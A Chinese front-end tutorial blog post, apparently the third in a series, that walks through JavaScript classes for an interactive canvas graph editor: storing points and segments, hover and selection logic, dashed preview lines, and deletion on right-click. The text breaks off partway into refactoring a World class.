                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这是<strong>纯前端手搓虚拟世界</strong>第三篇。</p>
<p>小小抱怨一下，感觉没啥人关注这种哇。</p>
<p>悲伤~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5143034a1d784814b270fd5a8623c105~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765637930&amp;x-signature=txUC07TRLWNSP0Brcn7BqZ1HALY%3D" alt="a4.jpg" loading="lazy"/></p>
<p>本期代码量超标！！慎重！</p>
<h2 data-id="heading-0">gogogo!</h2>
<p>欸，朋友，我们已经在前面构建了点（Point2D）和线（Segment）这两个类了嘛。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cba95994aefb44f388348be6eeb20369~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765637930&amp;x-signature=Mxd5BzrsSy6jcKVPfTd3BWd1FpM%3D" alt="image.png" loading="lazy"/></p>
<p>咳咳~这两天看<strong>新疆风味视频</strong>有点多了。脑子里大概模仿了下。</p>
<p>回归正题，在前两篇中，我们搞出了一个<strong>分形树</strong>还有一个<strong>喷绘效果</strong>。但那些玩意，从艺术角度来说就很空洞。</p>
<p>为什么？<strong>因为它无法交互，光看不能摸</strong></p>
<p>一个真正的虚拟世界，没有“上帝”，那是不完美的。本篇要解决的，就是给这个虚拟世界装上“上帝之手”，而这个上帝之手的连接线，就是鼠标。这样，就能从“看画模式”进化到“编辑模式”。</p>
<hr/>
<h2 data-id="heading-1">战略思考</h2>
<p>好了，暂停下吹牛，先思考下，如果是鼠标交互目前的虚拟世界，该怎么弄？？？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f01ead56aba48b9a450a591b06ec487~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765637930&amp;x-signature=1rrg8i0i9EjyAxWu8pngjV3fnU0%3D" alt="98b9a8d586cc43f2a6248b86dab2de2b.gif" loading="lazy"/></p>
<p>思考完毕，我给出我的方案。再撸一个类**图形编辑器（Graph Editor）**，总体如下：</p>
<ol>
<li><strong>数据容器（graph）</strong>：我们需要一个容器，专门管理所有的<code>Point</code>（点）和<code>Segment</code>（线段）。不能再像画分型图那样写死坐标了。</li>
<li><strong>交互控制器（graphEditor）</strong>：监听鼠标的点击(Left Click)、移动(Move)、右键（Right Click）。</li>
<li><strong>视觉交互</strong>：
<ul>
<li>鼠标悬停在点上，点要变亮（Hover 态）。</li>
<li>选中一个点后，鼠标移动要带出一条虚线（Intention，意图）。</li>
<li>点击右键，取消操作或删除元素。</li>
</ul>
</li>
</ol>
<p>嗯~跟你想的差不多吧？</p>
<h2 data-id="heading-2">战术制定</h2>
<p>好了，思路有了，开始具体的代码实现。</p>
<p>为了代码的健壮性，不能把代码全堆在 <code>index.js</code> 里，不然后续，就会变成屎山，身为一个有抱负的前端佬，我们得先抽个象。</p>
<p>详细步骤如下：</p>
<ul>
<li><strong><code>Graph</code>类</strong>。它像一个数据库，只管存点、存线、加、删、画。</li>
<li><strong><code>GraphEditor</code>类</strong>。它是逻辑大脑，负责处理整个鼠标事件和交互，判断“我现在点到了谁”。</li>
<li><strong>构建一个数学工具</strong>。计算鼠标靠近哪个点以及距离，用于判断是否选中（也就是高中数学：两点间距离）。</li>
<li><strong>重写 <code>World</code>类</strong>。启用 <code>requestAnimationFrame</code> 动画循环，因为交互是实时的，要绘制线的拉伸效果，画面需要每次都去更新，目前定为每秒刷新 60 次，后续会重点说明这个。</li>
</ul>
<hr/>
<h2 data-id="heading-3">先不解释，上代码！</h2>
<h3 data-id="heading-4">数据容器：<code>Graph</code></h3>
<p>在 <code>src</code> 下新建 <code>math</code> 文件夹，创建 <code>graph.js</code>。
它的职责非常单纯：<strong>管数据</strong>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/math/graph.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Graph</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">points = [], segments = []</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">points</span> = points;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">segments</span> = segments;
  }

  <span class="hljs-comment">// 添加点</span>
  <span class="hljs-title function_">addPoint</span>(<span class="hljs-params">point</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">points</span>.<span class="hljs-title function_">push</span>(point);
  }

  <span class="hljs-comment">// 判断是否已经有点在这个位置了（防止重叠点）</span>
  <span class="hljs-title function_">containsPoint</span>(<span class="hljs-params">point</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">points</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-title function_">equals</span>(point));
  }

  <span class="hljs-comment">// 添加线段</span>
  <span class="hljs-title function_">addSegment</span>(<span class="hljs-params">seg</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">segments</span>.<span class="hljs-title function_">push</span>(seg);
  }

  <span class="hljs-comment">// 判断线段是否已存在</span>
  <span class="hljs-title function_">containsSegment</span>(<span class="hljs-params">seg</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">segments</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">s</span>) =&gt;</span> s.<span class="hljs-title function_">equals</span>(seg));
  }

  <span class="hljs-comment">// 尝试添加点（去重）</span>
  <span class="hljs-title function_">tryAddPoint</span>(<span class="hljs-params">point</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">containsPoint</span>(point)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addPoint</span>(point);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }

  <span class="hljs-comment">// 尝试添加线段（去重）</span>
  <span class="hljs-title function_">tryAddSegment</span>(<span class="hljs-params">seg</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">containsSegment</span>(seg)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addSegment</span>(seg);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }

  <span class="hljs-comment">// 删除点（非常重要：删点的时候，连着这个点的线也要一起删掉！）</span>
  <span class="hljs-title function_">removePoint</span>(<span class="hljs-params">point</span>) {
    <span class="hljs-comment">// 1. 从 points 数组移除</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">points</span>.<span class="hljs-title function_">splice</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">points</span>.<span class="hljs-title function_">indexOf</span>(point), <span class="hljs-number">1</span>);
    <span class="hljs-comment">// 2. 过滤掉所有包含这个点的线段</span>
    <span class="hljs-keyword">const</span> segs = <span class="hljs-variable language_">this</span>.<span class="hljs-property">segments</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">s</span>) =&gt;</span> s.<span class="hljs-title function_">includes</span>(point));
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> seg <span class="hljs-keyword">of</span> segs) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeSegment</span>(seg);
    }
  }

  <span class="hljs-comment">// 删除线</span>
  <span class="hljs-title function_">removeSegment</span>(<span class="hljs-params">seg</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">segments</span>.<span class="hljs-title function_">splice</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">segments</span>.<span class="hljs-title function_">indexOf</span>(seg), <span class="hljs-number">1</span>);
  }

  <span class="hljs-comment">// 这里的 draw 只是一个简单的代理，把任务分发给具体的元素</span>
  <span class="hljs-title function_">draw</span>(<span class="hljs-params">ctx</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> seg <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">segments</span>) {
      seg.<span class="hljs-title function_">draw</span>(ctx);
    }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> point <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">points</span>) {
      point.<span class="hljs-title function_">draw</span>(ctx);
    }
  }
}
</code></pre>
<blockquote>
<p><strong>补充修改：</strong> 我们的 <code>Point</code> 和 <code>Segment</code> 类之前比较简单，为了支持上面的去重和删除，我们需要在 <code>Point2D.js</code> 和 <code>Segment.js</code> 加两个小 方法（不用重写，加方法即可）。</p>
</blockquote>
<p><strong>手动给 <code>src/primitives/point2D.js</code> 添加：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">  <span class="hljs-comment">// 判断两个点坐标是否一样</span>
  <span class="hljs-title function_">equals</span>(<span class="hljs-params">point</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> === point.<span class="hljs-property">x</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> === point.<span class="hljs-property">y</span>;
  }
</code></pre>
<p><strong>手动给 <code>src/primitives/segment.js</code> 添加：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">  <span class="hljs-comment">// 判断线段是否包含某个点</span>
  <span class="hljs-title function_">includes</span>(<span class="hljs-params">point</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">p1</span>.<span class="hljs-title function_">equals</span>(point) || <span class="hljs-variable language_">this</span>.<span class="hljs-property">p2</span>.<span class="hljs-title function_">equals</span>(point);
  }
  
  <span class="hljs-comment">// 判断两条线是否一样（方向不同也算同一条线）</span>
  <span class="hljs-title function_">equals</span>(<span class="hljs-params">seg</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">includes</span>(seg.<span class="hljs-property">p1</span>) &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">includes</span>(seg.<span class="hljs-property">p2</span>);
  }
</code></pre>
<hr/>
<h3 data-id="heading-5">交互控制器：<code>GraphEditor</code></h3>
<p>这是今天的重头戏。在 <code>src</code> 下新建 <code>editors</code> 文件夹，创建 <code>graphEditor.js</code>。</p>
<p>逻辑有点绕，我给你理一下：</p>
<ol>
<li><strong>鼠标移动 (Move)</strong> -&gt; 检查附近有没有点 -&gt; 有就高亮 (<code>hovered</code>)。</li>
<li><strong>鼠标点击 (Down)</strong> -&gt;
<ul>
<li><strong>左键</strong>：
<ul>
<li>如果点在空地 -&gt; 创建新点。</li>
<li>如果之前选中了一个点 (<code>selected</code>) -&gt; 连线。</li>
<li>最后把当前点设为 <code>selected</code>（作为下一次连线的起点）。</li>
</ul>
</li>
<li><strong>右键</strong>：
<ul>
<li>如果正在连线（有 <code>selected</code>） -&gt; 取消选中（停止连线）。</li>
<li>如果没有连线，但鼠标下有点 (<code>hovered</code>) -&gt; 删除这个点。</li>
</ul>
</li>
</ul>
</li>
</ol>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/editors/graphEditor.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Point2D</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"../primitives/point2D.js"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Segment</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"../primitives/segment.js"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GraphEditor</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">canvas, graph</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = canvas;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span> = graph;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">"2d"</span>);

    <span class="hljs-comment">// 状态机</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 当前选中的点（用于连线起点）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span> = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// 鼠标悬停的点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dragging</span> = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 预留给未来拖拽用</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">mouse</span> = <span class="hljs-literal">null</span>;    <span class="hljs-comment">// 当前鼠标位置</span>

    <span class="hljs-comment">// 启动监听</span>
    <span class="hljs-variable language_">this</span>.#<span class="hljs-title function_">addEventListeners</span>();
  }

  #<span class="hljs-title function_">addEventListeners</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. 鼠标按下事件</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"mousedown"</span>, <span class="hljs-function">(<span class="hljs-params">evt</span>) =&gt;</span> {
      <span class="hljs-comment">// 只有左键(0)和右键(2)才处理</span>
      <span class="hljs-keyword">if</span> (evt.<span class="hljs-property">button</span> == <span class="hljs-number">2</span>) { 
        <span class="hljs-comment">// 右键逻辑</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span>) {
           <span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 取消当前选中，停止连线</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span>) {
           <span class="hljs-variable language_">this</span>.#<span class="hljs-title function_">removePoint</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span>); <span class="hljs-comment">// 删除点</span>
        }
      } 
      
      <span class="hljs-keyword">if</span> (evt.<span class="hljs-property">button</span> == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// 左键逻辑</span>
        <span class="hljs-comment">// 如果鼠标在某个点上，就选中它；如果不在，就新建一个点并选中它</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span>) {
          <span class="hljs-variable language_">this</span>.#<span class="hljs-title function_">select</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span>);
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">dragging</span> = <span class="hljs-literal">true</span>;
          <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>.<span class="hljs-title function_">tryAddPoint</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">mouse</span>);
        <span class="hljs-variable language_">this</span>.#<span class="hljs-title function_">select</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">mouse</span>); <span class="hljs-comment">// 自动选中新点，方便连续画线</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">mouse</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">dragging</span> = <span class="hljs-literal">true</span>;
      }
    });

    <span class="hljs-comment">// 2. 鼠标移动事件</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"mousemove"</span>, <span class="hljs-function">(<span class="hljs-params">evt</span>) =&gt;</span> {
      <span class="hljs-comment">// 获取鼠标在 Canvas 里的坐标（即使 Canvas 缩放或偏移也能用）</span>
      <span class="hljs-comment">// 这里先简化处理，假设 Canvas 铺满或者无偏移</span>
      <span class="hljs-comment">// 实际上我们应该写个 getViewportPoint，但暂时先直接读取 offsetX/Y</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">mouse</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Point2D</span>(evt.<span class="hljs-property">offsetX</span>, evt.<span class="hljs-property">offsetY</span>);
      
      <span class="hljs-comment">// 检查鼠标有没有悬停在某个点上</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span> = <span class="hljs-variable language_">this</span>.#<span class="hljs-title function_">getNearestPoint</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">mouse</span>);
      
      <span class="hljs-comment">// 移动的时候不需要重绘吗？需要的，但我们会在 World 里统一驱动动画循环</span>
    });
    
    <span class="hljs-comment">// 3. 禁止右键菜单弹出</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"contextmenu"</span>, <span class="hljs-function">(<span class="hljs-params">evt</span>) =&gt;</span> evt.<span class="hljs-title function_">preventDefault</span>());
    
    <span class="hljs-comment">// 4. 鼠标抬起（结束拖拽状态）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"mouseup"</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">dragging</span> = <span class="hljs-literal">false</span>);
  }

  #<span class="hljs-title function_">select</span>(<span class="hljs-params">point</span>) {
    <span class="hljs-comment">// 如果之前已经选中了一个点，现在又选了一个点，说明要连线</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span>) {
      <span class="hljs-comment">// 尝试添加线段</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>.<span class="hljs-title function_">tryAddSegment</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Segment</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span>, point));
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span> = point;
  }

  #<span class="hljs-title function_">removePoint</span>(<span class="hljs-params">point</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>.<span class="hljs-title function_">removePoint</span>(point);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span> == point) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span> = <span class="hljs-literal">null</span>;
    }
  }

  <span class="hljs-comment">// 辅助函数：找离鼠标最近的点</span>
  #<span class="hljs-title function_">getNearestPoint</span>(<span class="hljs-params">point, minThreshold = <span class="hljs-number">15</span></span>) {
     <span class="hljs-keyword">let</span> nearest = <span class="hljs-literal">null</span>;
     <span class="hljs-keyword">let</span> minDist = <span class="hljs-title class_">Number</span>.<span class="hljs-property">MAX_SAFE_INTEGER</span>;
     
     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> p <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>.<span class="hljs-property">points</span>) {
       <span class="hljs-keyword">const</span> dist = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">hypot</span>(p.<span class="hljs-property">x</span> - point.<span class="hljs-property">x</span>, p.<span class="hljs-property">y</span> - point.<span class="hljs-property">y</span>);
       <span class="hljs-keyword">if</span> (dist &lt; minThreshold &amp;&amp; dist &lt; minDist) {
         minDist = dist;
         nearest = p;
       }
     }
     <span class="hljs-keyword">return</span> nearest;
  }

  <span class="hljs-comment">// 专门负责画编辑器相关的 UI（比如高亮、虚线）</span>
  <span class="hljs-title function_">display</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>.<span class="hljs-title function_">draw</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>);

    <span class="hljs-comment">// 如果有悬停的点，画个特殊的样式</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span>.<span class="hljs-title function_">draw</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>, { <span class="hljs-attr">outline</span>: <span class="hljs-literal">true</span> });
    }
    
    <span class="hljs-comment">// 如果有选中的点，也高亮一下</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span>) {
        <span class="hljs-comment">// 获取鼠标位置作为意图终点</span>
        <span class="hljs-keyword">const</span> intent = <span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span> ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">hovered</span> : <span class="hljs-variable language_">this</span>.<span class="hljs-property">mouse</span>;
        <span class="hljs-comment">// 画出“虚拟线条”：从选中点 -&gt; 鼠标位置</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Segment</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span>, intent).<span class="hljs-title function_">draw</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>, { <span class="hljs-attr">color</span>: <span class="hljs-string">"rgba(0,0,0,0.5)"</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">dash</span>: [<span class="hljs-number">3</span>, <span class="hljs-number">3</span>] });
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">selected</span>.<span class="hljs-title function_">draw</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>, { <span class="hljs-attr">outline</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">outlineColor</span>: <span class="hljs-string">"blue"</span> });
    }
  }
}
</code></pre>
<blockquote>
<p><strong>注意</strong>：上面的代码里用到了 <code>Segment</code> 的 <code>dash</code> 属性，你需要去 <code>segment.js</code> 的 <code>draw</code> 方法里微调一下，加个 <code>setLineDash</code>。</p>
</blockquote>
<p><strong>微调 <code>src/primitives/segment.js</code> 的 draw 方法：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">  <span class="hljs-title function_">draw</span>(<span class="hljs-params">ctx, { width = <span class="hljs-number">2</span>, color = <span class="hljs-string">"black"</span>, dash = [] } = {}</span>) {
    ctx.<span class="hljs-title function_">beginPath</span>();
    ctx.<span class="hljs-property">lineWidth</span> = width;
    ctx.<span class="hljs-property">strokeStyle</span> = color;
    ctx.<span class="hljs-title function_">setLineDash</span>(dash); <span class="hljs-comment">// 新增：支持虚线</span>
    ctx.<span class="hljs-title function_">moveTo</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">p1</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">p1</span>.<span class="hljs-property">y</span>);
    ctx.<span class="hljs-title function_">lineTo</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">p2</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">p2</span>.<span class="hljs-property">y</span>);
    ctx.<span class="hljs-title function_">stroke</span>();
    ctx.<span class="hljs-title function_">setLineDash</span>([]); <span class="hljs-comment">// 重置，防止影响其他绘制</span>
  }
</code></pre>
<hr/>
<h3 data-id="heading-6">组装世界：重构 <code>World</code></h3>
<p>现在我们把 <code>Graph</code> 和 <code>GraphEditor</code> 装进 <code>World</code> 里，并启动动画循环。</p>
<p>修改 <code>src/index.js</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Point2D</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./primitives/point2D.js"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Segment</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./primitives/segment.js"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Graph</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./math/graph.js"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">GraphEditor</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./editors/graphEditor.js"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">World</span> {
